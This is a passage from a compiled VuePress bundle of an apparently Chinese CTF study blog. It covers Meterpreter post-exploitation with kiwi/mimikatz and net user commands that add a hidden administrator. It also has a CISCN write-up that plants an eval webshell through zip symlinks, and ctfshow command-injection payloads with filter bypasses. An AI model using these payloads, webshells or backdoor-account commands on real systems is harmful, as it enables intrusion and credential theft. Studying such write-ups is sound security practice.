originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png" data="aurora"></p>\n<p>要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了</p>\n<p>meterpreter 是可以加载很多模块进行利用的</p>\n<h3 id="模块利用" tabindex="-1"><a class="header-anchor" href="#模块利用" aria-hidden="true">#</a> 模块利用</h3>\n<p>我是先学了<strong>kiwi</strong>模块</p>\n<p>这个首先得load kiwi加载模块</p>\n<p>其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的</p>\n<p>sysinfo看系统信息</p>\n<p>ps看进程</p>\n<p>migrate [PID]换进程</p>\n<p>具体可以参考<a href="https://blog.csdn.net/weixin_45588247/article/details/119497964" target="_blank" rel="noopener noreferrer">MSF中kiwi(mimikatz)模块的使用<ExternalLinkIcon/></a></p>\n<p>这个是shell中主机操作 <a href="https://chenchena.blog.csdn.net/article/details/124493550" target="_blank" rel="noopener noreferrer">后渗透主机操作_渗透后控制主机_<ExternalLinkIcon/></a>用来关关防火墙，远控桌面</p>\n<h3 id="cmd命令" tabindex="-1"><a class="header-anchor" href="#cmd命令" aria-hidden="true">#</a> cmd命令</h3>\n<p>补一条拿了管理员权限增加用户命令</p>\n<p>net user [name] [paaswd] /add #增加用户</p>\n<p>net localgroup #查看计算机本地组用户，看一下什么是有管理员权限的</p>\n<p>net user [name]# 用于查看用户的相关信息，可以看用户组的改变</p>\n<p>net localgroup Adminstrators(组) [name] /add</p>\n<h2 id="文件格式" tabindex="-1"><a class="header-anchor" href="#文件格式" aria-hidden="true">#</a> 文件格式</h2>\n<h3 id="文件头和文件尾" tabindex="-1"><a class="header-anchor" href="#文件头和文件尾" aria-hidden="true">#</a> 文件头和文件尾</h3>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\nPNG (png)，            　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\nGIF (gif)，              　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                 ZIP Archive (zip)，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\n\nTIFF (tif)，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\nWindows Bitmap (bmp)，      文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\nCAD (dwg)，               文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\nAdobe Photoshop (psd)，      文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\nRich Text Format (rtf)，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\nXML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\nHTML (html)，              文件头：68746D6C3E\nEmail [thorough only] (eml)，   文件头：44656C69766572792D646174653A\nOutlook Express (dbx)，       文件头：CFAD12FEC5FD746F\nOutlook (pst)，             文件头：2142444E\nMS Word/Excel (xls.or.doc)，    文件头：D0CF11E0\nMS Access (mdb)，           文件头：5374616E64617264204A\nWordPerfect (wpd)，          文件头：FF575043\nAdobe Acrobat (pdf)，        文件头：255044462D312E\nQuicken (qdf)，             文件头：AC9EBD8F\nWindows Password (pwl)，     文件头：E3828596\n\nRAR Archive (rar)，           文件头：52617221\nWave (wav)，               文件头：57415645\nAVI (avi)，                 文件头：41564920\nReal Audio (ram)，           文件头：2E7261FD\nReal Media (rm)，            文件头：2E524D46\nMPEG (mpg)，              文件头：000001BA\nMPEG (mpg)，              文件头：000001B3\nQuicktime (mov)，           文件头：6D6F6F76\nWindows Media (asf)，        文件头：3026B2758E66CF11\nMIDI (mid)，                文件头：4D546864\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div>',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/tool/1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/tool/1.md",filePathRelative:"tool/1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tool/1.html.vue",componentFilePathRelative:"pages/tool/1.html.vue",componentFileChunkName:"v-811949f4",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tool/1.html.js",dataFilePathRelative:"pages/tool/1.html.js",dataFileChunkName:"v-811949f4",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/tool/1.html",htmlFilePathRelative:"tool/1.html"},{data:{key:"v-83363a96",path:"/web/ciscn.html",title:"ciscn初赛刷题",lang:"zh-CN",frontmatter:{date:"2023/5/30 19:57",stick:!0,keyword:"misc,ctfshow",description:"刷题",title:"ciscn初赛刷题",tag:["刷题"],categories:["ciscn初赛","歪比八卜"]},excerpt:"",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],git:{}},key:"v-83363a96",path:"/web/ciscn.html",title:"ciscn初赛刷题",lang:"zh-CN",frontmatter:{date:"2023/5/30 19:57",stick:!0,keyword:"misc,ctfshow",description:"刷题",title:"ciscn初赛刷题",tag:["刷题"],categories:["ciscn初赛","歪比八卜"]},excerpt:"",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],content:'\r\n### unzip\r\n\r\n```php\r\n <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\r\nif (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === \'application/zip\'){\r\n    exec(\'cd /tmp && unzip -o \' . $_FILES["file"]["tmp_name"]);\r\n}; \r\n```\r\n\r\n> 网站源码如上 \r\n>\r\n> 大概意思就是[$_FILES](https://blog.csdn.net/weixin_46142761/article/details/121858917)的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录 \r\n>\r\n> 这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了\r\n\r\n> 首先建立软连接\r\n\r\n![image-20230529203732497](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png)\r\n\r\n![image-20230529203805218](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png)\r\n\r\n> 进入到文件夹中然后写一个马\r\n>\r\n> 马的内容是\r\n>\r\n> ```php\r\n> <?php eval($_POST["1"]);?>\r\n> ```\r\n\r\n![image-20230529203956226](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png)\r\n\r\n> 这里用到了zip命令中的-y参数[zip命令详解](https://www.cnbugs.com/post-4092.html)\r\n>\r\n> -y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；\r\n>\r\n> -r 是递归处理，将指定目录下的所有文件和子目录一并处理；\r\n\r\n![image-20230529204737313](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png)\r\n\r\n> 构建好两个压缩包就可以开始上传了\r\n>\r\n> 先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录/var/www/html\r\n>\r\n> 然后就可以愉快rce了\r\n\r\n![image-20230529205248147](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png)',contentRendered:'<h3 id="unzip" tabindex="-1"><a class="header-anchor" href="#unzip" aria-hidden="true">#</a> unzip</h3>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>\n<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">\'application/zip\'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">\'cd /tmp &amp;&amp; unzip -o \'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span> \n</span></code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><blockquote>\n<p>网站源码如上</p>\n<p>大概意思就是<a href="https://blog.csdn.net/weixin_46142761/article/details/121858917" target="_blank" rel="noopener noreferrer">$_FILES<ExternalLinkIcon/></a>的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录</p>\n<p>这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了</p>\n</blockquote>\n<blockquote>\n<p>首先建立软连接</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203732497" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203805218" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png" data="aurora"></p>\n<blockquote>\n<p>进入到文件夹中然后写一个马</p>\n<p>马的内容是</p>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203956226" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png" data="aurora"></p>\n<blockquote>\n<p>这里用到了zip命令中的-y参数<a href="https://www.cnbugs.com/post-4092.html" target="_blank" rel="noopener noreferrer">zip命令详解<ExternalLinkIcon/></a></p>\n<p>-y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；</p>\n<p>-r 是递归处理，将指定目录下的所有文件和子目录一并处理；</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529204737313" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png" data="aurora"></p>\n<blockquote>\n<p>构建好两个压缩包就可以开始上传了</p>\n<p>先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录/var/www/html</p>\n<p>然后就可以愉快rce了</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529205248147" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/ciscn.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"ciscn",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/ciscn.md",filePathRelative:"web/ciscn.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/ciscn.html.vue",componentFilePathRelative:"pages/web/ciscn.html.vue",componentFileChunkName:"v-83363a96",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/ciscn.html.js",dataFilePathRelative:"pages/web/ciscn.html.js",dataFileChunkName:"v-83363a96",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/ciscn.html",htmlFilePathRelative:"web/ciscn.html"},{data:{key:"v-d8e4d770",path:"/web/web1.html",title:"命令执行刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"命令执行刷题",tag:["ctfshow刷题"],categories:["命令执行","歪比八卜"]},excerpt:"",headers:[{level:2,title:"命令执行",slug:"命令执行",children:[{level:3,title:"Web29-37",slug:"web29-37",children:[]},{level:3,title:"Web39",slug:"web39",children:[]},{level:3,title:"Web40",slug:"web40",children:[]},{level:3,title:"Web43",slug:"web43",children:[]},{level:3,title:"Web44",slug:"web44",children:[]},{level:3,title:"Web45",slug:"web45",children:[]},{level:3,title:"Web46",slug:"web46",children:[]},{level:3,title:"Web47",slug:"web47",children:[]},{level:3,title:"Web48",slug:"web48",children:[]},{level:3,title:"Web49",slug:"web49",children:[]},{level:3,title:"Web50",slug:"web50",children:[]},{level:3,title:"Web51",slug:"web51",children:[]},{level:3,title:"Web52",slug:"web52",children:[]},{level:3,title:"Web53",slug:"web53",children:[]},{level:3,title:"Web54",slug:"web54",children:[]},{level:3,title:"Web55",slug:"web55",children:[]},{level:3,title:"Web56",slug:"web56",children:[]},{level:3,title:"Web57",slug:"web57",children:[]},{level:3,title:"Web58",slug:"web58",children:[]},{level:3,title:"Web59",slug:"web59",children:[]},{level:3,title:"Web60",slug:"web60",children:[]},{level:3,title:"Web61 62",slug:"web61-62",children:[]},{level:3,title:"Web66",slug:"web66",children:[]},{level:3,title:"Web67",slug:"web67",children:[]},{level:3,title:"Web68",slug:"web68",children:[]},{level:3,title:"Web70",slug:"web70",children:[]},{level:3,title:"Web71",slug:"web71",children:[]},{level:3,title:"Web72",slug:"web72",children:[]},{level:3,title:"Web73",slug:"web73",children:[]},{level:3,title:"Web74",slug:"web74",children:[]},{level:3,title:"Web75",slug:"web75",children:[]}]}],git:{}},key:"v-d8e4d770",path:"/web/web1.html",title:"命令执行刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"命令执行刷题",tag:["ctfshow刷题"],categories:["命令执行","歪比八卜"]},excerpt:"",headers:[{level:2,title:"命令执行",slug:"命令执行",children:[{level:3,title:"Web29-37",slug:"web29-37",children:[]},{level:3,title:"Web39",slug:"web39",children:[]},{level:3,title:"Web40",slug:"web40",children:[]},{level:3,title:"Web43",slug:"web43",children:[]},{level:3,title:"Web44",slug:"web44",children:[]},{level:3,title:"Web45",slug:"web45",children:[]},{level:3,title:"Web46",slug:"web46",children:[]},{level:3,title:"Web47",slug:"web47",children:[]},{level:3,title:"Web48",slug:"web48",children:[]},{level:3,title:"Web49",slug:"web49",children:[]},{level:3,title:"Web50",slug:"web50",children:[]},{level:3,title:"Web51",slug:"web51",children:[]},{level:3,title:"Web52",slug:"web52",children:[]},{level:3,title:"Web53",slug:"web53",children:[]},{level:3,title:"Web54",slug:"web54",children:[]},{level:3,title:"Web55",slug:"web55",children:[]},{level:3,title:"Web56",slug:"web56",children:[]},{level:3,title:"Web57",slug:"web57",children:[]},{level:3,title:"Web58",slug:"web58",children:[]},{level:3,title:"Web59",slug:"web59",children:[]},{level:3,title:"Web60",slug:"web60",children:[]},{level:3,title:"Web61 62",slug:"web61-62",children:[]},{level:3,title:"Web66",slug:"web66",children:[]},{level:3,title:"Web67",slug:"web67",children:[]},{level:3,title:"Web68",slug:"web68",children:[]},{level:3,title:"Web70",slug:"web70",children:[]},{level:3,title:"Web71",slug:"web71",children:[]},{level:3,title:"Web72",slug:"web72",children:[]},{level:3,title:"Web73",slug:"web73",children:[]},{level:3,title:"Web74",slug:"web74",children:[]},{level:3,title:"Web75",slug:"web75",children:[]}]}],content:'\r\n##  命令执行\r\n\r\n### Web29-37\r\n\r\n> 都使用get传参，\r\n\r\n> 根据被屏蔽的字词的不同考虑不同的解法\r\n>\r\n> （1）system（“”）；执行一系列查看文件操作\r\n>\r\n> （2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset \r\n\r\n> 常用Payload   ?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\r\n\r\n> Filter伪协议 常用于读取文件/源码\r\n\r\n### Web39\r\n\r\n> 使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行\r\n\r\n> 短标签就是把<?php 换成<?=  前提是这个功能打开\r\n\r\n> Payload\r\n>\r\n> ```php\r\n> ?c=data://text/plain,<?php system(“tac f*”);?>\r\n> ```\r\n>\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" />\r\n\r\n### Web40\r\n\r\n ![image-20230530153304420](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png)\r\n\r\n\r\n\r\n> **RCE无参数**\r\n\r\n> localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)\r\n\r\n> scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件\r\n\r\n> pos()：返回数组中的当前元素的值。\r\n\r\n> array_reverse()：数组逆序\r\n\r\n> next()： 函数将内部指针指向数组中的下一个元素，并输出。\r\n\r\n> highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)\r\n\r\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" />\r\n\r\n> show_source(next(array_reverse(scandir(pos(localeconv())))));\r\n\r\n> ?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\r\n\r\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" />\r\n\r\n### Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  />\r\n\r\n \r\n\r\n> 代码中插入了>/dev/null 2>&1，“>/dev/null 2>&1”的作用就是不回显。\r\n\r\n> （分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&&或者(%27%27)||绕过\r\n\r\n> 不是很明白的一个点&&需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , / , ? , : , @ , = &可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。\r\n\r\n> Payload：?c=tac f*||\r\n\r\n### Web44\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif)\r\n\r\n> 跟上面一题一样 多了过滤flag 用通配符就行\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif)\r\n\r\n### Web45\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif)\r\n\r\n> 没什么特别的多了过滤空格常见方法如下\r\n\r\n```\r\n%09（url传递）  表示的是tab (cat%09flag.php)\r\n${IFS}\r\n$IFS$9\r\n<>（cat<>flag）\r\n<（cat<flag）\r\n```\r\n\r\n> {cat,flag}原理参考：https://blog.csdn.net/m0_56059226/article/details/117997472\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif)\r\n\r\n### Web46![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif)\r\n\r\n> 过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤\r\n\r\n> 过滤了$ $$$所以不能用${IFS}绕过空格\r\n\r\n> 沿用上一题的payload就行\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" />\r\n\r\n### Web47\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif)\r\n\r\n> 过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容\r\n\r\n> less:与 more 类似\r\n\r\n> head:查看头几行\r\n\r\n> tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\r\n\r\n> tail:查看尾几行\r\n\r\n> nl：显示的时候，顺便输出行号\r\n\r\n> od:以二进制的方式读取档案内容\r\n\r\n> vi:一种编辑器，这个也可以查看\r\n\r\n> vim:一种编辑器，这个也可以查看\r\n\r\n> sort:可以查看\r\n\r\n> uniq:可以查看\r\n\r\n> file -f:报错出具体内容）还是一样用tac没什么好说的\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif)\r\n\r\n### Web48\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif)\r\n\r\n> 还是过滤多了sed cut等Linux命令\r\n\r\n> 用上一题payload\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif)\r\n\r\n### Web49\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif)\r\n\r\n> 多了% 不过跟题目没啥关系 沿用上题payload\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif)\r\n\r\n### Web50\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif)\r\n\r\n> 过滤了&（%26）和tab（%09） 一样啊 用<绕过空格\r\n\r\n> 但是不能用？通配符 ？？？\r\n\r\n> 利用shall特性用’’或者””或者\\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\\t或者c\\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号(\\)转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如\\$，$则不再表示变量的意思。)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif)\r\n\r\n### Web51\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif)\r\n\r\n> 多过滤了tac 换个nl继续用\r\n\r\n> 或者继续ta\\c\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif)\r\n\r\n### Web52\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif)\r\n\r\n> 常规去做 发现过滤了上一题的<> 有点惯性思维去找其他解题方法 没有看见没有过滤$\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif)\r\n\r\n> 发现被耍了 这个flag.php中不是答案\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif)\r\n\r\n> 查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif)\r\n\r\n> 二可行\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif)\r\n\r\n> 查看一下flag这个文件的权限有rx，应该是可以读\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif)\r\n\r\n### Web53\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif)\r\n\r\n> 看了一下是echo函数 然后多了变量d后会system$c\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif)\r\n\r\n> 常规看一下文件内容 有flag.php 直接看\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif)\r\n\r\n### Web54\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif)\r\n\r\n> 在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif)\r\n\r\n### Web55\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif)\r\n\r\n> 过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过/bin/base64输出flag \r\n\r\n> 第二种方法试了下发现不能用 \r\n\r\n> 仔细研究了p神的文章https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\r\n\r\n> 具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. " ./ “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中\r\n\r\n \r\n\r\n> \\2. ” . " 的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）\r\n\r\n> 上传的文件会临时储存在一个地址下一般为/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令\r\n\r\n![image-20230530200618504](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png)\r\n\r\n ![image-20230530200629352](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png)\r\n\r\n> 最后rce\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  />\r\n\r\n### Web56\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif)\r\n\r\n> 比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传\r\n\r\n![image-20230530200527722](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png)\r\n\r\n### Web57\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif)\r\n\r\n> 多过滤了. 和? 所以不能像上一题用文件上传\r\n\r\n> 这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c=36就行了\r\n\r\n> ```\r\n> 在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2\r\n> $a+$b就等同于$((1+2))\r\n> ```\r\n>\r\n> \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif)\r\n\r\n> 一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))\r\n\r\n> 所以要输出36 需要37个\r\n>\r\n> ```\r\n> $((~$(())))\r\n> ```\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif)\r\n\r\n \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif)\r\n\r\n### Web58\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif)\r\n\r\n> 